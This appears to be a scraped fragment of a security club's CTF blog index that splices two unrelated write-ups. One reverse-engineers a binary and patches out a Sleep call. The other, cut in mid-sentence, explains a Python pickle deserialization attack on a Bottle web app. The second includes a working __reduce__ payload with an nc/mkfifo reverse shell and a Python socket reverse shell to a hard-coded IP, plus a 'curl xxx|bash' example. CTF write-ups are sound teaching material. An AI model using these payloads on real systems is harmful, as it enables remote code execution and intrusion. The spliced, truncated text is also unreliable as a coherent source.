By using IDA Pro or Ghidra or any other kinds of decompiler, we will get the decompiled code.\nAnalyze the main function, we claim that the program initiates an array whose size is 45, then modifies it through some more functions, as shown below.\nint __cdecl main(int argc, const char **argv, const char **envp) { void *Block; // [esp+4h] [ebp-BCh] int v5[45]; // [esp+8h] [ebp-B8h] BYREF v5[0] = 10; v5[1] = -3; ... snip v5[43] = 14; v5[44] = 16; Block = (void *)sub_401AC0(v5, 38, 0); sub_4013B0(Block); sub_401B40(Block); return 0; } The function sub_401AC0(v5, 38, 0) allocates dynamic memory using malloc based on v5 then assigns it into variable Block. That variable is then being passed into function sub_4013B0(Block), which will produce our flag once we have fixed it.\nint __cdecl sub_4013B0(_DWORD *a1) { int result; // eax int v2; // eax int v3; // [esp+4h] [ebp-64h] ... snip int v37; // [esp+64h] [ebp-4h] int v38; // [esp+64h] [ebp-4h] while ( 1 ) { v6 = *(_DWORD *)(a1[1] + 4 * a1[3]++); result = v6 - 1; switch ( v6 ) { case 1: v22 = *(_DWORD *)(a1[2] + 4 * a1[4]--); v26 = *(_DWORD *)(a1[2] + 4 * a1[4]--); v2 = sub_401110(v26, v22); v16 = a1[4] + 1; a1[4] = v16; *(_DWORD *)(a1[2] + 4 * v16) = v2; break; case 2: ... snip case 4: ... snip case 5: ... snip case 6: ... snip case 7: ... snip case 8: ... snip case 9: ... snip case 10: ... snip case 11: ... snip case 12: ... snip case 13: ... snip case 14: v38 = *(_DWORD *)(a1[2] + 4 * a1[4]--); sub_401040(\u0026#34;RESULT: %d\\n\u0026#34;, v38); sub_401260(v38); break; case 15: ... snip case 16: ... snip case 17: ... snip case 18: ... snip default: continue; } } } It is easy to observe that only case 1 and case 14 involve calling other functions.\nTo be more precise, if the program reaches case 1, the function sub_401110(v26, v22) will be called, and on the other hand, if the program reaches case 14, the function sub_401260(v38) will be called. We will talk more about these two functions in the next parts of this blog.\nReaching case 14 As stated earlier, the function sub_401260(v38) will be called if the program reaches case 14, which will be the last part of our code flow.\nint __cdecl sub_401260(char a1) { char v2[256]; // [esp+10h] [ebp-224h] BYREF char Buffer; // [esp+110h] [ebp-124h] BYREF _BYTE v4[3]; // [esp+111h] [ebp-123h] BYREF char v5[32]; // [esp+210h] [ebp-24h] BYREF qmemcpy(v5, \u0026#34;Áõ\u0026#34;, 2); v5[2] = -77; v5[3] = 26; ... snip v5[28] = -66; v5[29] = 63; memset(v2, 0, sizeof(v2)); sub_401D50(\u0026amp;Buffer, \u0026#34;%d\u0026#34;, 55 * a1); sub_401160(v5, v2, 30, \u0026amp;Buffer, \u0026amp;v4[strlen(\u0026amp;Buffer)] - v4); return sub_401040(\u0026#34;flag is: %s\u0026#34;, (char)v2); } The function receives our modified variable Block, then uses it to produce our flag.\nReaching case 1 Here is where things get interesting. Take a look at the function sub_401110(v26, v22), we can conclude that this is why our program runs slowly. The fact that it makes our program sleeps plus it is possibly called many times throughout the process makes our executable runs without any output for a very long time.\nint __cdecl sub_401110(int a1, int a2) { int v3; // [esp+0h] [ebp-4h] v3 = sub_4010F0(0); Sleep(1000 * a1); Sleep(1000 * a2); return sub_4010F0(0) - v3; } The algorithm here is very simple, however this is author’s idea to let the program sleeps for a total of (a1 + a2) seconds each time this function is called. The intended result of this function is to return a1 + a2. We will have to patch the binary to get our flag.\nPatch the binary So we know what makes our program runs slowly, it is time to fix that. Below is the decompiled assembly code of that part.\nmov ecx, [ebp+arg_0] mov edx, [ecx+10h] sub edx, 1 mov eax, [ebp+arg_0] mov [eax+10h], edx mov ecx, [ebp+var_10] push ecx mov edx, [ebp+var_C] push edx call sub_401110 add esp, 8 mov [ebp+var_58], eax mov eax, [ebp+arg_0] Instead of calling sub_401110, we should patch the program to directly calculates ecx + edx then assigns it into eax. We find out that the opcode of call sub_401110 is E8 77 FC FF FF.\nUsing IDA Pro integrated settings, which can be found at Options \u0026gt; Generals \u0026gt; Number of Opcode bytes (non-graph) set to a large enough number, we can view each instruction’s opcode.\nWith pwntools library, we also find out the opcode for add ecx, edx and move eax, ecx is 01 D1 and 89 C8 using this script written in Python below.\nfrom pwn import * context.arch = \u0026#39;amd64\u0026#39; print(asm(\u0026#39;add ecx, edx\u0026#39;)) print(asm(\u0026#39;mov eax, ecx\u0026#39;)) It is now time to patch the binary.

STOP pickle still allows you to define a custom behavior for the pickling process for your class instances.\nThe __reduce__() method takes no argument and shall return either a string or preferably a tuple (the returned object is often referred to as the “reduce value”). […] When a tuple is returned, it must be between two and six items long. Optional items can either be omitted, or None can be provided as their value. The semantics of each item are in order: A callable object that will be called to create the initial version of the object. A tuple of arguments for the callable object. An empty tuple must be given if the callable does not accept any argument. […] So by implementing __reduce__ in a class which instances we are going to pickle, we can give the pickling process a callable plus some arguments to run. While intended for reconstructing objects, we can abuse this for getting our own reverse shell code executed.\nSo if any value in the array pass into pickle.dumps is an instance containing __reduce__(…) function, that reduce will be executed when calling pickle.loads(…). And the __reduce__(…) implement demand returns an tuple with first value an executable, callable method in python for example (os.system, eval or any function), the second value is argument of the callable.\nSo by implement reduce method that return (eval, (\u0026#39;__import__(\u0026#34;os\u0026#34;).popen(\u0026#34;curl xxx|bash\u0026#34;)\u0026#39;,)) , we can execute code on the server.\nThe exercise step Generate cookie Add an class definition with __reduce__ method (that return reverse shell python code) to create an instance, then pass the instance to the session1[’name’] that passed into set_cookie.\nclass RCE: def __reduce__(self): # 14.186.174.164 cmd = (\u0026#39;rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2\u0026gt;\u0026amp;1 | nc 14.186.174.164 55555 \u0026gt; /tmp/f\u0026#39;) return os.system, ((f\u0026#34;\u0026#34;\u0026#34;python -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;14.186.174.164\u0026#34;,55555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]);\u0026#39;\u0026#34;\u0026#34;\u0026#34;),) # Test @route(\u0026#34;/sign\u0026#34;) def index(): session = request.get_cookie(\u0026#34;name\u0026#34;, secret=sekai) print(session[\u0026#34;name\u0026#34;]) if not session or session[\u0026#34;name\u0026#34;] == \u0026#34;guest\u0026#34;: objWithReduce = RCE() session = …","date":1673481600,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1673481600,"objectID":"2256b16fb9515e2dc5aa0a85914de4e5","permalink":"https://blog.bkisc.com/blog/duti/sekai-ctf-2022-bottle-poem/","publishdate":"2023-01-12T00:00:00Z","relpermalink":"/blog/duti/sekai-ctf-2022-bottle-poem/","section":"blog","summary":"Deserialization attack with Python Bottle.","tags":["ctf","writeup","web exploitation"],"title":"Sekai CTF 2022 Bottle Poem","type":"blog"},{"authors":[],"categories":null,"content":" ","date":1666893600,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1666893600,"objectID":"8e723f582259e44e14817f259e85b85a","permalink":"https://blog.bkisc.com/event/2022-10-27-hieupc-talk/","publishdate":"2017-01-01T00:00:00Z","relpermalink":"/event/2022-10-27-hieupc-talk/","section":"event","summary":"Anh Ngô Minh Hiếu, hiện là chuyên viên kỹ thuật tại Trung tâm Giám sát và An toàn không gian mạng Quốc gia (NCSC), sẽ có những chia sẻ về kinh nghiệm của bản thân trong việc ngăn chặn các thông tin lừa đảo, giả mạo, không chính thống.
